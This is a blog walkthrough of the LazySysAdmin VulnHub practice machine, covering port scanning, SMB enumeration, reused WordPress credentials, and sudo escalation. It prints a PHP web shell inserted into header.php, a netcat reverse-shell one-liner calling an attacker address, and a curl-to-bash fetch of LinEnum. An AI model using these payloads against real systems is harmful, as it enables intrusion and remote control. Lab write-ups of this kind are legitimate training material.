---
layout: post
title:  "Lazysysadmin: Vulnhub Walkthrough"
date:   2018-07-02 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [Togie Mcdogie][2] and is part of a series called `LazySysAdmin`. Its graded as intermediate but I rank it as intermediate. As this is purely for educational purposes I'll throw in spoilers now. Its got re-used credentials from an abandoned CMS and being an old VM at time of writing we can throw some kernel exploits at it. To exploit this machine we'll need to chain two different exploits. Without much further ado here we go. Word from the author:

```
Difficulty: Beginner - Intermediate

Boot2root created out of frustration from failing my first OSCP exam attempt.

Aimed at:

      > Teaching newcomers the basics of Linux enumeration
      > Myself, I suck with Linux and wanted to learn more about each service whilst
      creating a playground for others to learn
Special thanks to @RobertWinkel @dooktwit for hosting LazySysAdmin at Sectalks Brisbane
BNE0x18
```
<!--more-->
## Information Gathering
Start off with masscan

```
# masscan 192.168.175.133 -p0-65535 --rate 100000 | cut -d " " -f 4 | cut -d "/" -f 1

```
Then we'll do the nmap scan:
![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 4.png)
```
# nmap -sV -O -p 22,80,139,445,3306,6667 - lazysysadmin -oN '/root/oscp/exam/lazysysadmin/lazysysadmin.nmap'
INFO: RESULT BELOW - Finished with BASIC Nmap-scan for lazysysadmin

Starting Nmap 7.40 ( https://nmap.org ) at 2018-09-19 12:52 AEST
Nmap scan report for lazysysadmin (192.168.175.129)
Host is up (0.00033s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
```
There's a webserver on port 80:

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 5.png)
```
# dirb http://lazysysadmin:80/ -S -r
...

---- Scanning URL: http://lazysysadmin:80/ ----
==> DIRECTORY: http://lazysysadmin:80/apache/
+ http://lazysysadmin:80/index.html (CODE:200|SIZE:36072)
+ http://lazysysadmin:80/info.php (CODE:200|SIZE:77248)
==> DIRECTORY: http://lazysysadmin:80/javascript/
==> DIRECTORY: http://lazysysadmin:80/old/
==> DIRECTORY: http://lazysysadmin:80/phpmyadmin/
+ http://lazysysadmin:80/robots.txt (CODE:200|SIZE:92)
+ http://lazysysadmin:80/server-status (CODE:403|SIZE:292)
==> DIRECTORY: http://lazysysadmin:80/test/
==> DIRECTORY: http://lazysysadmin:80/wordpress/
==> DIRECTORY: http://lazysysadmin:80/wp/
```
Dirb shows, that we may have wordpress running on the `/wordpress` directory. Let's keep going:

Enumerating port 445 using `smbclient`

```
# smbclient //192.168.1.105/share$
WARNING: The "syslog" option is deprecated
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls
  .                                   D        0  Tue Aug 15 21:05:52 2017
  ..                                  D        0  Mon Aug 14 22:34:47 2017
  wordpress                           D        0  Wed Sep 19 12:52:50 2018
  Backnode_files                      D        0  Mon Aug 14 22:08:26 2017
  wp                                  D        0  Tue Aug 15 20:51:23 2017
  deets.txt                           N      139  Mon Aug 14 22:20:05 2017
  robots.txt                          N       92  Mon Aug 14 22:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 22:39:56 2017
  apache                              D        0  Mon Aug 14 22:35:19 2017
  index.html                          N    36072  Sun Aug  6 15:02:15 2017
  info.php                            N       20  Tue Aug 15 20:55:19 2017
  test                                D        0  Mon Aug 14 22:35:10 2017
  old                                 D        0  Mon Aug 14 22:35:13 2017

                3029776 blocks of size 1024. 1346976 blocks available
smb: \wordpress\> get deets.txt
smb: \wordpress\> get robots.txt
smb: \wordpress\> get todolist.txt
smb: \> cd wordpress
smb: \wordpress\> ls
  .                                   D        0  Wed Sep 19 12:52:50 2018
  ..                                  D        0  Tue Aug 15 21:05:52 2017
  wp-config-sample.php                N     2853  Wed Dec 16 20:58:26 2015
  wp-trackback.php                    N     4513  Sat Oct 15 06:39:28 2016
  wp-admin                            D        0  Thu Aug  3 07:02:02 2017
  wp-settings.php                     N    16200  Fri Apr  7 04:01:42 2017
  wp-blog-header.php                  N      364  Sat Dec 19 22:20:28 2015
  index.php                           N      418  Wed Sep 25 10:18:11 2013
  wp-cron.php                         N     3286  Mon May 25 03:26:25 2015
  wp-links-opml.php                   N     2422  Mon Nov 21 13:46:30 2016
  readme.html                         N     7413  Mon Sep 10 14:44:20 2018
  wp-signup.php                       N    29924  Tue Jan 24 22:08:42 2017
  wp-content                          D        0  Tue Sep 11 00:48:42 2018
  license.txt                         N    19935  Mon Sep 10 14:44:20 2018
  wp-mail.php                         N     8048  Wed Jan 11 16:13:43 2017
  wp-activate.php                     N     5447  Wed Sep 28 07:36:28 2016
  .htaccess                           H       35  Tue Aug 15 21:40:13 2017
  xmlrpc.php                          N     3065  Thu Sep  1 02:31:29 2016
  wp-login.php                        N    34337  Mon Sep 10 14:44:20 2018
  wp-load.php                         N     3301  Tue Oct 25 14:15:30 2016
  wp-comments-post.php                N     1627  Mon Aug 29 22:00:32 2016
  wp-config.php
smb: \wordpress\> get wp-config.php
```
Check out the contents of these files:
```
# cat deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
# cat robots.txt
User-agent: *
Disallow: /old/
Disallow: /test/
Disallow: /TR2/
Disallow: /Backnode_files/

```

The `robots.txt` has the same contents as we got when enumerating using nmap. Hence the publicly accessible share$ folder is the root directory of the website.

1. Use wpscan to enumerate for users and try to bruteforce the site.

> wpscan -u 192.168.175.133/wordpress --enumerate u

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 15.png)

We got the admin user and tried to bruteforce with hydra luck.


2. Check for credentials in wp-config:

```
# grep -i 'pass\|user' wp-config.php

/** MySQL database username */
define('DB_USER', 'Admin');
/** MySQL database password */
define('DB_PASSWORD', 'TogieMYSQL12345^^');
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
```

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 6.png)

This gives us login credentials site. This credential works for both phpmyadmin as well as wordpress.

__username: admin__

__password: TogieMYSQL12345^^__

Login and start editing php. Adding `echo system($_REQUEST ['cmd']);` to header.php:

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 9.png)

Using burp we can then make and intercept requests. We used the following payload:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 7.png)

Start a nc listener.
![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 10.png)

We get our reverse shell.
## Low privilege shell
Download the `LinEnum.sh` script from github and run it. Start a server on the host to serve the script. Get it using curl.
```
www-data@LazySysAdmin:/var/www/html/wordpress$ curl 192.168.175.132/LinEnum.sh | bash
```

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 11.png)

Then check out the user groups:
```
www-data@LazySysAdmin:/var/www/html/wordpress$ id
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)

```
![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 12.png)

togie belongs to sudo group.

Earlier we got `deets.txt` file with the password `12345`. We use this to log in as togie:
```
www-data@LazySysAdmin:/var/www/html/wordpress$ su - togie
Password:
togie@LazySysAdmin:~$ ls
togie@LazySysAdmin:~$ sudo -su
togie@LazySysAdmin:~$ sudo -l
[sudo] password for togie:
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL

```

![5-1.png](/assets/images/posts/lazysysadmin-vulnhub-walkthrough/screenshot 13.png)

## Privilege escalation
Looks like togie can execute all commands as root. Priv Esc is thus trivial.
```
togie@LazySysAdmin:~$ ls /root
ls: cannot open directory /root: Permission denied
togie@LazySysAdmin:~$ id
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:~$ sudo -i
root@LazySysAdmin:~#
```
[1]: https://www.vulnhub.com/entry/lazysysadmin-1,205/
[2]: https://twitter.com/@TogieMcdogie
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
